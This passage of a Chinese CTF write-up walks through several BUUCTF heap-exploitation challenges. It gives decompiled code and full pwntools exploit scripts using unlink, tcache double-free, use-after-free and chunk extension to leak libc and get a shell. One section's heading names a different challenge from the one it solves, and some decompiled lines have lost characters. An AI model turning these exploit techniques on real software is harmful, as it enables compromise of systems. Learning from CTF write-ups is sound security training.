        ptr += i;
        size -= i;
      }
      if ( size )
        result = 0xFFFFFFFFLL;
      else
        result = 0LL;
      return result;
    }
再来看看删除的函数，在free掉chunk后也对数组进行了置零处理。
    __int64 sub_400B07()
    {
      unsigned int v1; // [rsp+Ch] [rbp-74h]
      char s[104]; // [rsp+10h] [rbp-70h] BYREF
      unsigned __int64 v3; // [rsp+78h] [rbp-8h]
      v3 = __readfsqword(0x28u);
      fgets(s, 16, stdin);
      v1 = atol(s);
      if ( v1 > 0x100000 )
        return 0xFFFFFFFFLL;
      if ( !(&chunk_array)[v1] )
        return 0xFFFFFFFFLL;
      free((&chunk_array)[v1]);
      (&chunk_array)[v1] = 0LL;
      return 0LL;
    }
由于没有给我们输出功能，我们想要通过输出got表地址来得到libc的基址，就要想办法去输出chunk的内容，我们可以通过UNlink来拿到数组的修改能力，然后将free函数、puts函数、atoi函数的got表地址写入数组，然后通过修改函数对free函数的got表进行改写，将puts函数的plt表地址写入，这样当我们调用free函数时实际上就是调用了puts函数，就实现了输出功能。
如图三个函数的got表已经被我们写入数组。
修改完free函数的got表后，free掉chunk1，就能将puts函数的实际地址输出，就得到了libc的基址。这里有一个小地方可以稍微注意一下，接收数据时，他是先输出一个回车，然后输出地址，然后输出`'OK\n'`，最开始没注意，困在这好久，
有了libc后，就有了system函数的地址，写入atoi函数的got表，然后输入字符串`/bin/sh`即可getshell。
exp:
    from pwn import *
    from LibcSearcher import *
    context(log_level='debug', arch='amd64', os='linux')
    # io = process('./stkof')
    io = remote('node3.buuoj.cn', 27229)
    elf = ELF('./stkof')
    free_got = elf.got['free']
    puts_got = elf.got['puts']
    puts_plt = elf.plt['puts']
    atoi_got = elf.got['atoi']
    def add(size):
        io.sendline(str(1))
        io.sendline(str(size))
        io.recvuntil('OK')
    def edit(index, size, content):
        io.sendline(str(2))
        io.sendline(str(index))
        io.sendline(str(size))
        io.send(content)
        io.recvuntil('OK')
    def delete(index):
        io.sendline(str(3))
        io.sendline(str(index))
    array = 0x602148
    add(0x10) # 1
    add(0x30) # 2
    add(0x80) # 3
    add(0x20) # 4
    fake_chunk = p64(0) + p64(0x30) + p64(array + 8 - 0x18)
    fake_chunk += p64(array + 8 - 0x10) + 'a' * 0x10 + p64(0x30) + p64(0x90)
    edit(2, len(fake_chunk), fake_chunk)
    delete(3)
    io.recvuntil('OK')
    payload = 'a' * 8 + p64(free_got) + p64(puts_got) + p64(atoi_got)
    edit(2, len(payload), payload)
    edit(0, len(p64(puts_plt)), p64(puts_plt))
    # gdb.attach(io, 'b *0x400c85')
    delete(1)
    io.recvuntil('\n')
    puts_addr = u64(io.recv(6).ljust(8,'\x00'))
    print(hex(puts_addr))
    libc = LibcSearcher('puts', puts_addr)
    libc_base = puts_addr - libc.dump('puts')
    system = libc_base + libc.dump('system')
    edit(2, 8, p64(system))
    io.sendline('/bin/sh')
    io.interactive()
## 0x0c ciscn_2019_es_1
这题环境是Ubuntu18，libc的版本是2.29，相比2.23多了一个tcache机制，用于链接空闲的 chunk 结构体，其中的 next
指针指向下一个大小相同的 chunk，具体可见 ctfwiki。
> tcache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术，目的是提升堆管理的性能。但提升性能的同时舍弃了很多安全检查  
>  ————ctfwiki
本题的漏洞在 `call()`
函数中，也就是对chunk进行删除的函数，在进行free后并没有对chunk进行置零处理，也没有修改数组中的值，明显的UAF漏洞。
    unsigned __int64 call()
    {
      int v1; // [rsp+4h] [rbp-Ch] BYREF
      unsigned __int64 v2; // [rsp+8h] [rbp-8h]
      v2 = __readfsqword(0x28u);
      puts("Please input the index:");
      __isoc99_scanf("%d", &v1);
      if ( (&heap_addr)[v1] )
        free(*(void **)(&heap_addr)[v1]);
      puts("You try it!");
      puts("Done");
      return __readfsqword(0x28u) ^ v2;
    }
这里可以选择通过double free来控制tcache bins，修改 tcache bin
中的数量以及链头地址，使得chunk在free后进入unsortbins中，进而泄露处libc的基址。也可以选择申请一块大小超过tcache范围的chunk，在free后不进入tcache，更方便泄露libc的基址。
先申请三块chunk，然后free掉chunk0，此时chunk0的fd指针指向 `main_arena+96`
处，由于存在UAF漏洞，直接输出chunk0，然后就可以得到了libc的基址。
接下来再申请一块chunk，大小为0x500，将chunk0的空间申请掉，然后利用tcache，double free申请到free_hook
的空间，将one_gadget写入，对chunk进行free即可getshell。
这里简单说一下利用tcache的double
free来达到任意地址写，tcache与fastbins类似，也是通过fd指针来进行空闲chunk的连接，但是不同的是fastbins的fd指针指向的是chunk的开头，而tcache的指针指向用户输入内容的地址开头。
我们对一块chunk进行double
free后，就是下图上面的样子，申请一块相同大小的chunk，然后输入内容为我们想要控制的内存的地址，就成了下图step2的样子，再申请两块相同大小的chunk就拿到了我们想要控制的内存的指针，就达到了任意地址写的目的。
exp:
    from pwn import *
    context(log_level='debug', arch='amd64', os='linux')
    io = process('./ciscn_2019_es_1',env={"LD_PRELOAD":"./libc-2.27.so"})
    # io = process('./ciscn_2019_es_1')
    # io = remote('node3.buuoj.cn', 28114)
    libc = ELF('./libc-2.27.so')
    def add(size, content, call):
        io.sendlineafter('choice:', str(1))
        io.sendlineafter('Please input the size of compary\'s name\n', str(size))
        io.sendafter('please input name:', content)
        io.sendafter('please input compary call:', call)
        io.recvuntil('Done!\n')
    def display(index):
        io.sendlineafter('choice:', str(2))
        io.sendlineafter('Please input the index:\n', str(index))
        io.recvuntil('name:\n')
    def delete(index):
        io.sendlineafter('choice:', str(3))
        io.sendlineafter('Please input the index:\n', str(index))
    add(0x500, 'content', 'call') # 0
    add(0x60, 'content', 'call') # 1
    add(0x60, 'content', 'call') # 2
    delete(0)
    display(0)
    main_arena = u64(io.recv(6).ljust(8, '\x00'))
    print(hex(main_arena))
    libc_base = main_arena - 0x3ebca0
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    free_hook = libc_base + libc.sym['__free_hook']
    print('libc_base -> ' + hex(libc_base))
    print('malloc_hook -> ' + hex(malloc_hook))
    print('free_hook -> ' + hex(free_hook))
    onegadget = libc_base + 0x4f322
    add(0x500, 'aaaa', 'aaaa')
    delete(1)
    delete(1)
    add(0x60, p64(free_hook), 'a' * 8)
    add(0x60, 'a' * 8, 'a' * 8)
    add(0x60, p64(onegadget), 'a' * 8)
    delete(0)
    io.interactive()
## 0x0d picoctf_2018_can_you_gets_me
依然是一道菜单题，四个功能。
来看看申请的函数，先申请了0x10大小的空间，用来存储之后申请的内存的大小以及地址。这里申请空间大小受到了限制，只能申请0x18或者0x38大小的空间。
    unsigned __int64 create()
    {
      char *v0; // rbx
      int i; // [rsp+4h] [rbp-2Ch]
      size_t size; // [rsp+8h] [rbp-28h]
      char buf[8]; // [rsp+10h] [rbp-20h] BYREF
      unsigned __int64 v5; // [rsp+18h] [rbp-18h]
      v5 = __readfsqword(0x28u);
      for ( i = 0; i  9 )
      {
        puts("Out of bound!");
        _exit(0);
      }
      if ( heaparray[v1] )
      {
        printf("Content: ");
        read_input(*((_QWORD *)heaparray[v1] + 1), *(_QWORD *)heaparray[v1] + 1LL);
        puts("Done!");
      }
      else
      {
        puts("How Dare you!");
      }
      return __readfsqword(0x28u) ^ v3;
    }
到这就有了思路，通过溢出一字节覆盖下一chunk的size位，也就是存储用户申请chunk的size和地址的chunk（姑且称之为 heap
struct），实现 Chunk Extend ，然后将其free，此时bins中的情况是这样的， `0x14e32c0` 是用户申请chunk的地址，
`0x14e32a0` 是因为我们刚才修改了struct的size位。
再进行申请，我们申请的chunk就会将struct包含在其中，我们将atoi函数的got表地址写入struct，然后进行输出，就会输出atoi函数的真实地址，就可以将libc的基址泄露出来，然后将atoi函数的got进行覆写，修改为system函数的地址，然后输入
`/bin/sh\x00` 即可getshell。
exp:
    from pwn import *
    # io = process('./npuctf_2020_easyheap',env={"LD_PRELOAD":"./libc-2.27.so"})
    # io = process('./npuctf_2020_easyheap')
    io = remote('node3.buuoj.cn', 26590)
    elf = ELF('./npuctf_2020_easyheap')
    libc = ELF('./libc-2.27.so')
    def add(size, content):
        io.sendlineafter('Your choice :', str(1))
        io.sendlineafter('Size of Heap(0x10 or 0x20 only) : ', str(size))
        io.sendafter('Content:', content)
        io.recvuntil('Done!\n')
    def edit(index, content):
        io.sendlineafter('Your choice :', str(2))
        io.sendlineafter('Index :', str(index))
        io.sendafter('Content: ', content)
        io.recvuntil('Done!\n')
    def display(index):
        io.sendlineafter('Your choice :', str(3))
        io.sendlineafter('Index :', str(index))
        io.recvuntil('Content : ')
    def delete(index):
        io.sendlineafter('Your choice :', str(4))
        io.sendlineafter('Index :', str(index))
    add(0x18, 'aaaa') # 0
    add(0x18, 'bbbb') # 1
    edit(0, 'a' * 0x18 + '\x41')
    delete(1)
    payload = 'a' * 0x18 + p64(0x21) + p64(0x38) + p64(elf.got['atoi'])
    add(0x38, payload) #,2
    display(1)
    atoi_address = u64(io.recv(6).ljust(8, '\x00'))
    print(hex(atoi_address))
    libc_base = atoi_address - libc.symbols['atoi']
    print('libc_base -> ' + hex(libc_base))
    edit(1, p64(libc_base + libc.symbols['system']))
    io.sendlineafter('Your choice :', '/bin/sh\x00')
    io.interactive()
## 0x0e gyctf_2020_some_thing_exceting
我们可以看到在程序刚开始时，会读取根目录下的flag文件，将其写入bss段的变量中，没有该文件则退出程序。
    unsigned __int64 sub_400896()
    {
      FILE *stream; // [rsp+0h] [rbp-10h]
      unsigned __int64 v2; // [rsp+8h] [rbp-8h]
      v2 = __readfsqword(0x28u);
      setbuf(stdin, 0LL);
      setbuf(stdout, 0LL);
      stream = fopen("/flag", "r");
      if ( !stream )
      {
        puts("Emmmmmm!Maybe you want Fool me!");
        exit(0);
      }
      byte_6020A0 = 96;
      fgets(flag, 45, stream);
      return __readfsqword(0x28u) ^ v2;
    }
该程序有三个功能，编辑功能其实会让我们退出程序，只有增加、删除和输出功能。
增加功能会申请一块0x10大小的空间，用来存储接下来申请的两块chunk的地址，然后接下来申请的空间的大小不能超过0x70。
漏洞出现在删除函数中，这里只是将其free掉，没有置零，存在UAF漏洞。
    unsigned __int64 sub_400C24()
    {
      int v1; // [rsp+4h] [rbp-Ch] BYREF
      unsigned __int64 v2; // [rsp+8h] [rbp-8h]
      v2 = __readfsqword(0x28u);
      puts("#######################");
      puts("#    Delete Banana    #");
      puts("#---------------------#");
      printf("> Banana ID : ");
      _isoc99_scanf("%d", &v1);
      if ( v1  10 || !*(&ptr + v1) )
      {
        puts("Emmmmmm!Maybe you want Fool me!");
        lea();
      }
      free(*(void **)*(&ptr + v1));
      free(*((void **)*(&ptr + v1) + 1));
      free(*(&ptr + v1));
      puts("#---------------------#");